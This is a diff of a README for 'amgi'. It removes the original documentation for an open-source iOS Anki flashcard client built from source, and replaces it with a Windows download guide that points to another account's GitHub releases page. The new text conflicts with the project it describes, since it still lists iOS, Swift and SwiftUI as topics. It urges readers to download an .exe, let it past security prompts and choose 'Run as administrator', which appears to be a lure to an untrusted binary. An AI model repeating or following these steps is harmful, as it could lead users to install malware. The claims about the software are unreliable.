@@ -1,142 +1,225 @@
-<h1 align="center">Amgi</h1>
+# 💠 amgi - Offline flashcards that stay in sync
 
-<p align="center">
-  <em>암기 (amgi) — Korean for "memorization"</em>
-</p>
+[![Download amgi](https://img.shields.io/badge/Download-amgi%20Releases-4f46e5?style=for-the-badge&logo=github)](https://github.com/angelinaviolable23/amgi/releases)
 
-<p align="center">
-  An open-source, offline-first Anki-compatible iOS flashcard client with sync server support.
-</p>
+## 📥 Download amgi
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Swift-6.2-F05138?logo=swift&logoColor=white" alt="Swift 6.2">
-  <img src="https://img.shields.io/badge/iOS-17%2B-000000?logo=apple&logoColor=white" alt="iOS 17+">
-  <img src="https://img.shields.io/badge/Rust-FFI-DEA584?logo=rust&logoColor=white" alt="Rust FFI">
-  <img src="https://img.shields.io/badge/License-AGPL--3.0-blue" alt="AGPL-3.0">
-</p>
+Visit the releases page to download and run the app on Windows:
 
----
+https://github.com/angelinaviolable23/amgi/releases
 
-Amgi wraps the official [ankitects/anki](https://github.com/ankitects/anki) Rust backend via C FFI, giving you a native SwiftUI experience backed by the same battle-tested engine that powers Anki Desktop and AnkiDroid. Sync your decks with any compatible sync server (including self-hosted), study with FSRS scheduling, and keep your review history in perfect sync across all your devices.
+## 🖥️ What amgi does
 
-## Features
+amgi is an offline-first flashcard app that works with Anki decks and sync support. It is built for people who want to study without needing a constant internet connection.
 
-- **Sync Server Support** -- login, sync, full upload/download, bidirectional review sync with any compatible server
-- **FSRS Scheduling** -- powered by the official Rust FSRS engine, not a reimplementation
-- **Card Rendering** -- Rust template engine renders cards exactly like desktop clients
-- **Deck Browser** -- hierarchical deck tree with recursive `DisclosureGroup` expand/collapse, new/learn/review count badges on every node
-- **Study Session** -- answer cards with Again/Hard/Good/Easy; next-interval labels shown above each button
-- **Note Browser** -- search notes across all decks, deck filter chips (top-level decks auto-include subdecks), lazy-load results (50 per page)
-- **Note Editor** -- edit note fields with accurate field names from the Rust notetype RPC
-- **Statistics Dashboard** -- full-year review heatmap (auto-scrolls to today), streak counter, retention rate, forecast chart, card count breakdown
-- **Offline-First** -- everything works offline; sync when you have a connection
-- **Swift 6.2 Strict Concurrency** -- zero data races, fully actor-isolated, `Sendable` throughout
+You can use it to:
 
-## Screenshots
+- Review flashcards on your own schedule
+- Keep studying even when you are offline
+- Work with Anki-compatible cards
+- Use spaced repetition for better recall
+- Sync your study data when needed
 
-<p align="center">
-    <img src="assets/decks.png" width="300" alt="Decks Screen" />
-    <img src="assets/stats.png" width="300" alt="Stats Screen" />
-</p>
+It uses the official Anki Rust backend through C FFI, which helps keep card behavior close to Anki.
 
-## Architecture
+## 🚀 Getting started on Windows
 
-```
-SwiftUI Views
-    |
-@DependencyClient structs
-    |
-AnkiBackend (Swift wrapper)
-    |
-C FFI (4 functions)
-    |
-Rust static library (ankitects/anki)
-```
+Follow these steps to download and run amgi on Windows.
 
-Swift owns the UI. Rust owns everything else -- database, sync, FSRS scheduling, card templates, statistics.
+1. Open the download page:
+   https://github.com/angelinaviolable23/amgi/releases
 
-For the full architecture walkthrough, see **[ARCHITECTURE.md](ARCHITECTURE.md)**.
+2. Look for the latest release near the top of the page.
 
-## Requirements
+3. Find the Windows file in the list of assets. It may end in `.exe`, `.zip`, or a similar Windows format.
 
-| Tool | Version |
-|------|---------|
-| iOS | 17.0+ |
-| Xcode | 16.0+ |
-| Rust | 1.92+ (via rustup) |
-| protoc | 3.0+ |
-| protoc-gen-swift | latest |
-| xcodegen | latest |
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
 
-## Getting Started
+5. Open the folder that contains the app.
 
-### 1. Clone with submodules
+6. If you see an `.exe` file, double-click it to start amgi.
 
-```bash
-git clone --recursive https://github.com/antigluten/amgi.git
-cd amgi
-```
+7. If Windows asks for permission, choose **Run**.
 
-### 2. Install dependencies
+8. If the app opens, you are ready to start using your flashcards.
 
-```bash
-# Rust toolchain
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-rustup target add aarch64-apple-ios aarch64-apple-ios-sim x86_64-apple-ios-simulator
+## 🧭 First launch
 
-# Protobuf compiler and Swift plugin
-brew install protobuf swift-protobuf
+When you open amgi for the first time, you may need to set up your card data or choose a local study folder.
 
-# Xcode project generator
-brew install xcodegen
-```
+A typical first setup looks like this:
 
-### 3. Build the Rust XCFramework
+- Choose where your flashcards will be stored
+- Import an Anki deck if you already have one
+- Connect sync settings if you plan to use a server
+- Pick your study options for new cards and reviews
 
-```bash
-./scripts/build-xcframework.sh
-```
+If you already use Anki, start by importing your deck and checking that your cards appear in the app.
 
-This cross-compiles the Rust bridge for iOS device and simulator, then packages both into `AnkiRust.xcframework`. The first build takes several minutes; incremental builds are fast.
+## 📚 Key features
 
-### 4. Generate Swift protobuf types
+### 📴 Offline-first study
+amgi is built to work without a live connection. Your cards stay available on your device, so you can keep reviewing at home, on a trip, or during a commute.
 
-```bash
-./scripts/generate-protos.sh
-```
+### 🔄 Anki-compatible
+The app follows Anki-style card behavior, so it fits common flashcard habits. This makes it easier to move from Anki or use the same study method across tools.
 
-### 5. Open in Xcode
+### ⏳ Spaced repetition
+amgi uses spaced repetition to show cards at the right time. Cards you know well appear less often. Harder cards come back sooner.
 
-```bash
-cd AnkiApp && xcodegen generate && cd ..
-open AnkiApp/AnkiApp.xcodeproj
-```
+### ☁️ Sync server support
+If you use sync, amgi can connect to a server and keep your study data aligned across devices. That helps if you study in more than one place.
 
-### 6. Build and Run
+### ⚙️ FSRS support
+The app supports FSRS-style scheduling, which helps the app choose review times based on how well you remember each card.
 
-Select an iOS Simulator or device, then build and run (Cmd+R).
+### 🧠 Built on the official Anki backend
+amgi uses the official Anki Rust backend through C FFI. That gives it a strong base for flashcard logic and deck handling.
 
-## Tech Stack
+## 🪟 Windows system setup
 
-- **UI**: SwiftUI with strict concurrency (Swift 6.2, language mode v6)
-- **Dependency Injection**: [swift-dependencies](https://github.com/pointfreeco/swift-dependencies) (`@DependencyClient` struct-closure pattern)
-- **Backend**: [ankitects/anki](https://github.com/ankitects/anki) Rust crate via C FFI
-- **Serialization**: Protocol Buffers (24 .proto service definitions)
-- **Database**: SQLite (owned by Rust backend)
-- **Build**: SPM for library modules, xcodegen for the app target
+amgi is meant to run on a modern Windows PC.
 
-## License
+Recommended setup:
 
-This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)** because it incorporates [ankitects/anki](https://github.com/ankitects/anki) (copyright Ankitects Pty Ltd), which is also AGPL-3.0. See [LICENSE](LICENSE) for the full license text.
+- Windows 10 or Windows 11
+- A standard keyboard and mouse
+- At least 4 GB of RAM
+- A few hundred MB of free disk space
+- A screen size that lets you read cards with ease
 
-The AGPL requires that if you distribute this software or run it as a network service, you must make the complete source code available under the same license.
+If your PC can run a modern desktop app, it should be fine for amgi.
 
-## Contributing
+## 📦 Install steps
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines, code style, and the development setup.
+Use this simple install flow after you open the releases page:
 
-## Acknowledgments
+1. Download the latest Windows release file.
+2. If the file is compressed, extract it.
+3. Move the app folder to a place you can find later, such as Desktop or Documents.
+4. Open the folder.
+5. Double-click the app file to launch it.
+6. If Windows shows a security prompt, allow the app to run.
 
-- **[Damien Elmes](https://github.com/dae)** and the [ankitects/anki](https://github.com/ankitects/anki) contributors for the Rust backend that powers this app
-- **[AnkiDroid](https://github.com/ankidroid/Anki-Android)** for pioneering the Rust backend bridge pattern on mobile
-- **[Point-Free](https://www.pointfree.co/)** for [swift-dependencies](https://github.com/pointfreeco/swift-dependencies)
+If the release includes more than one file, choose the one made for Windows.
+
+## 🗂️ Using your flashcards
+
+After setup, you can start a normal study session:
+
+- Open your deck
+- Review new cards
+- Grade each card based on how well you remember it
+- Let the app schedule the next review
+- Come back later for the next session
+
+A simple habit works well:
+
+- Study for a few minutes each day
+- Keep reviews short
+- Add new cards in small groups
+- Use the same routine so the schedule stays stable
+
+## 🔗 Sync and backup
+
+If you use sync, keep your data connected on every device you use.
+
+Good habits:
+
+- Sync after a study session
+- Check that your deck names match across devices
+- Keep a local backup of your card data
+- Update to the latest release when you want fixes and improvements
+
+If you only study on one PC, offline use is still enough for daily review.
+
+## 🛠️ Common file types you may see
+
+The release page may contain different file types. Here is what they usually mean:
+
+- `.exe` - a Windows app file you can run
+- `.zip` - a compressed file you need to extract first
+- `.msi` - a Windows installer
+- `.dmg` - for macOS
+- source files - for developers, not needed for normal use
+
+For Windows, focus on the file that is meant to run on Windows.
+
+## ❓ If the app does not open
+
+Try these steps:
+
+- Download the file again
+- Make sure the file finished downloading
+- Extract the archive before opening it
+- Right-click the app and choose **Run as administrator**
+- Check that your Windows version is up to date
+- Move the app to a simple folder path, such as `C:\Apps\amgi`
+
+If it still does not open, download the newest release from the releases page and try again.
+
+## 🧩 Project topics
+
+amgi is built around these areas:
+
+- Anki
+- flashcards
+- FSRS
+- iOS
+- Rust
+- spaced repetition
+- Swift
+- SwiftUI
+
+These topics match a study app that focuses on speed, memory, and clean card review.
+
+## 📁 File layout you may see after extraction
+
+After you unzip the release, you may see files like these:
+
+- `amgi.exe`
+- app support files
+- data folders
+- config files
+- readme or license files
+
+Do not delete the support files unless you know what they do. Keep the full folder together so the app can run normally.
+
+## ⌨️ Basic study flow
+
+A simple study flow in amgi looks like this:
+
+1. Open the app
+2. Choose a deck
+3. Review the first card
+4. Mark how well you remembered it
+5. Continue through the session
+6. Return later for the next set of reviews
+
+This keeps study fast and easy to repeat.
+
+## 🧪 Best results for daily use
+
+Use these habits to keep your study smooth:
+
+- Review at the same time each day
+- Keep your decks small and focused
+- Add clear questions and short answers
+- Avoid large study bursts
+- Sync after changes if you use more than one device
+
+Small, regular sessions work well with spaced repetition.
+
+## 📌 Download again anytime
+
+If you need the latest release, use the download page here:
+
+https://github.com/angelinaviolable23/amgi/releases
+
+## 🧭 What to do next
+
+- Download the newest Windows release
+- Extract it if needed
+- Open the app
+- Import or sync your cards
+- Start your first review session
